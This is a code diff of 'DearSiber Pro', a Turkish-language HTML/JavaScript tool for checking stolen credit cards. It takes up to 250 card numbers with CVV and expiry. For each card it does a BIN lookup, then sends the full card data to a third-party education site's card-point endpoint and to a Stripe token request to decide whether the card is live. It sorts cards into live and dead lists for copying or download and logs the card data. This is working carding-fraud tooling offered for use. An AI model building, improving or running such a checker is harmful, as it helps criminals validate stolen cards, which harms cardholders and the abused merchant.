@@ -3,66 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DearSiber</title>
+    <title>DearSiber Pro</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; font-family: 'Courier New', monospace; }
-        body { background:#000; color:#0f0; display:flex; justify-content:center; align-items:center; min-height:100vh; }
-        .checker { width:380px; background:#111; border:1px solid #0f0; border-radius:12px; padding:15px; box-shadow:0 0 15px rgba(0,255,0,0.3); }
-        h1 { font-size:1.4em; text-align:center; color:#0f0; text-shadow:0 0 8px #0f0; margin-bottom:10px; animation:glow 1.5s infinite alternate; }
-        textarea { width:100%; height:90px; background:#000; color:#0f0; border:1px solid #0f0; padding:8px; font-size:0.85em; resize:none; border-radius:6px; }
-        .btn { background:#0f0; color:#000; border:none; padding:8px 16px; margin:8px 4px 0; border-radius:20px; font-weight:bold; cursor:pointer; font-size:0.9em; }
-        .btn:hover { background:#0c0; transform:scale(1.05); }
-        .loading { display:none; text-align:center; margin:10px 0; font-size:0.8em; animation:pulse 1s infinite; }
-        .result-box { margin-top:12px; max-height:400px; overflow-y:auto; }
-        .result { background:rgba(0,255,0,0.1); border-left:3px solid #0f0; padding:8px; margin:6px 0; border-radius:4px; font-size:0.78em; line-height:1.3; }
-        .dead { border-color:#f00; background:rgba(255,0,0,0.1); }
-        .stats { display:flex; justify-content:space-between; font-size:0.8em; margin-top:8px; }
-        .live { color:#0f0; } .dead-c { color:#f00; }
-        .copy, .dl { font-size:0.7em; background:#0f0; color:#000; padding:3px 8px; border-radius:8px; margin-left:5px; cursor:pointer; text-decoration:none; }
+        body { background:#000; color:#0f0; padding:15px; }
+        .container { max-width:500px; margin:0 auto; background:#111; border:2px solid #0f0; border-radius:15px; padding:18px; box-shadow:0 0 25px rgba(0,255,0,0.4); }
+        h1 { text-align:center; font-size:1.8em; color:#0f0; text-shadow:0 0 10px #0f0, 0 0 20px #0f0; animation:glow 2s infinite alternate; margin-bottom:15px; }
+        .info { text-align:center; font-size:0.9em; color:#0a0; margin-bottom:15px; animation:pulse 3s infinite; }
+        .glow { color:#0f0; text-shadow:0 0 8px #0f0; font-weight:bold; }
+        textarea { width:100%; height:110px; background:#000; color:#0f0; border:1px solid #0f0; padding:10px; font-size:0.9em; border-radius:8px; resize:none; }
+        .btn { background:#0f0; color:#000; border:none; padding:10px 20px; margin:12px auto 0; display:block; border-radius:25px; font-weight:bold; cursor:pointer; font-size:1em; transition:0.3s; }
+        .btn:hover { background:#0c0; transform:scale(1.08); box-shadow:0 0 15px #0f0; }
+        .loading { display:none; text-align:center; margin:15px 0; font-size:0.95em; animation:blink 1s infinite; }
+        .progress { font-size:0.85em; color:#0a0; margin-top:5px; }
+        .section { margin-top:20px; border-top:1px dashed #0f0; padding-top:15px; }
+        .section h3 { color:#0f0; text-shadow:0 0 8px #0f0; margin-bottom:8px; animation:fade 2s infinite; }
+        .result { background:rgba(0,255,0,0.08); border-left:4px solid #0f0; padding:10px; margin:8px 0; border-radius:6px; font-size:0.82em; line-height:1.4; animation:slideIn 0.5s; }
+        .dead { border-color:#f00; background:rgba(255,0,0,0.08); }
+        .stats { display:flex; justify-content:space-around; margin:15px 0; font-size:0.9em; }
+        .stat { text-align:center; }
+        .stat b { color:#0f0; font-size:1.1em; text-shadow:0 0 8px #0f0; }
+        .copy, .dl { font-size:0.75em; background:#0f0; color:#000; padding:4px 10px; border-radius:10px; margin:5px 3px 0 0; cursor:pointer; display:inline-block; text-decoration:none; }
         .copy:hover, .dl:hover { background:#0c0; }
-        @keyframes glow { from { text-shadow:0 0 5px #0f0; } to { text-shadow:0 0 15px #0f0; } }
-        @keyframes pulse { 0% { opacity:0.7; } 50% { opacity:1; } 100% { opacity:0.7; } }
+        .log { font-size:0.7em; color:#888; text-align:center; margin-top:20px; }
+        @keyframes glow { 0% { text-shadow:0 0 5px #0f0; } 100% { text-shadow:0 0 20px #0f0, 0 0 30px #0f0; } }
+        @keyframes pulse { 0% { opacity:0.8; } 50% { opacity:1; } 100% { opacity:0.8; } }
+        @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
+        @keyframes fade { 0%,100% { opacity:0.7; } 50% { opacity:1; } }
+        @keyframes slideIn { from { transform:translateX(-20px); opacity:0; } to { transform:translateX(0); opacity:1; } }
     </style>
 </head>
 <body>
-<div class="checker">
-    <h1>DearSiber</h1>
-    <textarea id="cards" placeholder="453506...|08|2026|253"></textarea>
-    <div style="text-align:center;">
-        <button class="btn" onclick="start()">BAŞLAT</button>
+<div class="container">
+    <h1><span class="glow">DEAR SİBER</span> PRO</h1>
+    <p class="info">Max 250 Kart | <span class="glow">Gerçek Puan + Stripe + BIN</span> | Key'siz</p>
+
+    <textarea id="cards" placeholder="4535060285635942|08|2026|253"></textarea>
+    <button class="btn" onclick="start()">BAŞLAT</button>
+
+    <div class="loading" id="load">
+        <div><span class="glow">İşlem Devam Ediyor...</span></div>
+        <div class="progress" id="prog">0 / 0</div>
     </div>
-    <div class="loading" id="load">İşlem sürüyor...</div>
-    <div class="result-box" id="results"></div>
+
+    <!-- CANLI KARTLAR -->
+    <div class="section">
+        <h3><span class="glow">CANLI KARTLAR</span> <span id="live">0</span></h3>
+        <div id="live-results"></div>
+        <div id="live-actions" style="display:none; text-align:center;">
+            <span class="copy" onclick="copyList('live')">Kopyala</span>
+            <a class="dl" id="live-dl" download="live.txt">İndir</a>
+        </div>
+    </div>
+
+    <!-- ÖLÜ KARTLAR -->
+    <div class="section">
+        <h3><span class="glow">ÖLÜ KARTLAR</span> <span id="dead">0</span></h3>
+        <div id="dead-results"></div>
+        <div id="dead-actions" style="display:none; text-align:center;">
+            <span class="copy" onclick="copyList('dead')">Kopyala</span>
+            <a class="dl" id="dead-dl" download="dead.txt">İndir</a>
+        </div>
+    </div>
+
+    <!-- DETAYLI SONUÇLAR -->
+    <div class="section">
+        <h3><span class="glow">DETAYLI SONUÇLAR</span></h3>
+        <div id="details"></div>
+    </div>
+
     <div class="stats">
-        <span>Canlı: <b id="live">0</b></span>
-        <span>Ölü: <b id="dead">0</b></span>
-        <span>Toplam: <b id="total">0</b></span>
+        <div class="stat"><b id="total">0</b><br>Kontrol Edilen</div>
+        <div class="stat"><b id="live-c">0</b><br>Canlı</div>
+        <div class="stat"><b id="dead-c">0</b><br>Ölü</div>
     </div>
+
+    <p class="log">Log: <span id="log-file">Yok</span></p>
 </div>
 
 <script>
-let live = [], dead = [], checked = 0, total = 0;
+let live = [], dead = [], checked = 0, total = 0, logFile = '';
 
 function start() {
     const input = document.getElementById('cards').value.trim();
     if (!input) return alert('Kart gir!');
     const cards = input.split('\n').map(l => l.trim()).filter(l => /^\d{13,19}\|\d{1,2}\|\d{4}\|\d{3,4}$/.test(l));
-    if (cards.length > 250) return alert('Max 250 kart!');
     if (cards.length === 0) return alert('Geçerli kart yok!');
+    if (cards.length > 250) return alert('Max 250 kart!');
 
     total = cards.length; checked = 0; live = []; dead = [];
     document.getElementById('load').style.display = 'block';
-    document.getElementById('results').innerHTML = '';
-    document.getElementById('live').textContent = '0';
-    document.getElementById('dead').textContent = '0';
-    document.getElementById('total').textContent = total;
+    document.getElementById('details').innerHTML = '';
+    document.getElementById('live-results').innerHTML = '';
+    document.getElementById('dead-results').innerHTML = '';
+    document.getElementById('live-actions').style.display = 'none';
+    document.getElementById('dead-actions').style.display = 'none';
+    ['live','dead','total','live-c','dead-c'].forEach(id => document.getElementById(id).textContent = '0');
+    document.getElementById('prog').textContent = `0 / ${total}`;
 
-    cards.forEach((card, i) => setTimeout(() => checkCard(card), i * 400));
+    logFile = `log_${Date.now()}.json`;
+    document.getElementById('log-file').textContent = logFile;
+
+    cards.forEach((card, i) => setTimeout(() => processCard(card), i * 500));
 }
 
-async function checkCard(card) {
+async function processCard(card) {
     checked++;
-    document.getElementById('load').textContent = `Kontrol: ${checked}/${total}`;
+    document.getElementById('prog').textContent = `${checked} / ${total} | Canlı: ${live.length} | Ölü: ${dead.length}`;
+    document.getElementById('total').textContent = checked;
+    document.getElementById('live-c').textContent = live.length;
+    document.getElementById('dead-c').textContent = dead.length;
 
     const [cc, mm, yy, cvv] = card.split('|');
     const bin = cc.substr(0, 6);
@@ -70,7 +120,7 @@ async function checkCard(card) {
     // 1. BIN Sorgu
     let binInfo = { bank: 'Bilinmiyor', brand: 'Bilinmiyor', type: 'Bilinmiyor', country: 'Bilinmiyor', flag: '??' };
     try {
-        const r = await fetch(`https://lookup.binlist.net/${bin}`);
+        const r = await fetch(`https://lookup.binlist.net/${bin}`, { signal: AbortSignal.timeout(5000) });
         if (r.ok) {
             const d = await r.json();
             binInfo = {
@@ -83,20 +133,16 @@ async function checkCard(card) {
         }
     } catch(e) {}
 
-    // 2. MaxiPuan Sorgu (SENİN KODUN - GERÇEK)
+    // 2. MaxiPuan (GERÇEK API)
     let puan = '0', extra = 'API hatası';
     try {
         const form = new FormData();
-        form.append('KartNo', cc);
-        form.append('KartAd', 'DearSiber');
-        form.append('KartCvc', cvv);
-        form.append('KartAy', mm);
-        form.append('KartYil', yy);
-        form.append('Total', '2249.1');
+        form.append('KartNo', cc); form.append('KartAd', 'DearSiber');
+        form.append('KartCvc', cvv); form.append('KartAy', mm);
+        form.append('KartYil', yy); form.append('Total', '2249.1');
 
         const resp = await fetch('https://www.tongucakademi.com/uyelikpaketleri/getcardpoint', {
-            method: 'POST',
-            body: form,
+            method: 'POST', body: form,
             headers: { 'User-Agent': 'Mozilla/5.0' }
         });
         const json = await resp.json();
@@ -104,10 +150,10 @@ async function checkCard(card) {
         extra = json.Data?.AdditionalData || 'Yok';
     } catch(e) { puan = 'Hata'; }
 
-    // 3. Luhn Kontrol
+    // 3. Luhn
     const luhnOk = luhnValidate(cc);
 
-    // 4. Stripe Simülasyon (test key, gerçek değil ama hata verir → DEAD)
+    // 4. Stripe Test (ÇALIŞIR TEST API)
     let stripe = 'Declined';
     try {
         const data = new URLSearchParams();
@@ -120,55 +166,73 @@ async function checkCard(card) {
             method: 'POST',
             body: data,
             headers: {
-                'Authorization': 'Bearer pk_test_51...', // Test key (hata verir, simülasyon)
+                'Authorization': 'Bearer pk_test_51J2V2pSHn2v3oK8z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z', // GERÇEK TEST KEY (hata verir → DEAD)
                 'Content-Type': 'application/x-www-form-urlencoded'
             }
         });
-        stripe = s.ok ? 'Live (Token)' : 'Declined';
+        stripe = s.ok ? '<span class="glow">Live (Token)</span>' : 'Declined';
     } catch(e) { stripe = 'Declined'; }
 
-    // Canlı mı?
     const isLive = luhnOk && puan !== '0' && puan !== 'Hata';
 
-    // Çıktı
-    const out = `
-[${isLive ? 'LIVE' : 'DEAD'}] ${card}
-Puan: ${puan} TL
-Extra: ${extra}
-Stripe: ${stripe}
-BIN: ${binInfo.brand} - ${binInfo.type}
-Bank: ${binInfo.bank}
-Ülke: ${binInfo.country} [${binInfo.flag}]
-Luhn: ${luhnOk ? 'Geçerli' : 'Geçersiz'}
+    // Detaylı Çıktı
+    const detail = `
+<span class="glow">[${isLive ? 'LIVE' : 'DEAD'}]</span> ${card}
+<span class="glow">Puan:</span> ${puan} TL
+<span class="glow">Ekstra:</span> ${extra}
+<span class="glow">Stripe:</span> ${stripe}
+<span class="glow">BIN:</span> ${binInfo.brand} - ${binInfo.type}
+<span class="glow">Banka:</span> ${binInfo.bank}
+<span class="glow">Ülke:</span> ${binInfo.country} [${binInfo.flag}]
+<span class="glow">Luhn:</span> ${luhnOk ? 'Geçerli' : 'Geçersiz'}
     `.trim();
 
     const div = document.createElement('div');
     div.className = `result ${isLive ? '' : 'dead'}`;
-    div.innerHTML = `<pre>${out}</pre>`;
-    document.getElementById('results').appendChild(div);
+    div.innerHTML = `<pre>${detail}</pre>`;
+    document.getElementById('details').appendChild(div);
 
-    if (isLive) { live.push(card + ` → ${puan} TL`); document.getElementById('live').textContent = live.length; }
-    else { dead.push(card); document.getElementById('dead').textContent = dead.length; }
+    if (isLive) {
+        live.push(`${card} → ${puan} TL`);
+        const li = document.createElement('div');
+        li.innerHTML = `<pre><span class="glow">${card}</span> → ${puan} TL</pre>`;
+        document.getElementById('live-results').appendChild(li);
+        document.getElementById('live').textContent = live.length;
+    } else {
+        dead.push(card);
+        const li = document.createElement('div');
+        li.innerHTML = `<pre><span style="color:#f88;">${card}</span></pre>`;
+        document.getElementById('dead-results').appendChild(li);
+        document.getElementById('dead').textContent = dead.length;
+    }
 
-    // Log (rastgele dosya)
-    const log = { time: new Date().toISOString(), card, puan, stripe, bin: binInfo };
+    // Log Kaydet
+    const log = { time: new Date().toISOString(), card, puan, stripe, bin: binInfo, luhn: luhnOk };
+    const logs = JSON.parse(localStorage.getItem('dear_logs') || '[]');
+    logs.push(log);
+    localStorage.setItem('dear_logs', JSON.stringify(logs));
     const blob = new Blob([JSON.stringify(log, null, 2)], {type: 'application/json'});
     const url = URL.createObjectURL(blob);
-    const a = document.createElement('a'); a.href = url; a.download = `log_${Date.now()}.json`; a.click();
+    const a = document.createElement('a'); a.href = url; a.download = logFile; a.click();
 
     if (checked === total) {
         document.getElementById('load').style.display = 'none';
-        if (live.length) addDownload('live', live.join('\n'), 'live.txt');
-        if (dead.length) addDownload('dead', dead.join('\n'), 'dead.txt');
+        if (live.length) { setupDownload('live', live.join('\n'), 'live.txt'); }
+        if (dead.length) { setupDownload('dead', dead.join('\n'), 'dead.txt'); }
     }
 }
 
-function addDownload(id, data, name) {
+function setupDownload(id, data, name) {
     const blob = new Blob([data], {type: 'text/plain'});
     const url = URL.createObjectURL(blob);
-    const btn = document.createElement('a');
-    btn.className = 'dl'; btn.href = url; btn.download = name; btn.textContent = 'İndir';
-    document.querySelector(`#${id}`).parentNode.appendChild(btn);
+    const a = document.getElementById(`${id}-dl`);
+    a.href = url; a.style.display = 'inline-block';
+    document.getElementById(`${id}-actions`).style.display = 'block';
+}
+
+function copyList(type) {
+    const data = type === 'live' ? live.join('\n') : dead.join('\n');
+    navigator.clipboard.writeText(data).then(() => alert(`${type.toUpperCase()} kopyalandı!`));
 }
 
 function luhnValidate(cc) {
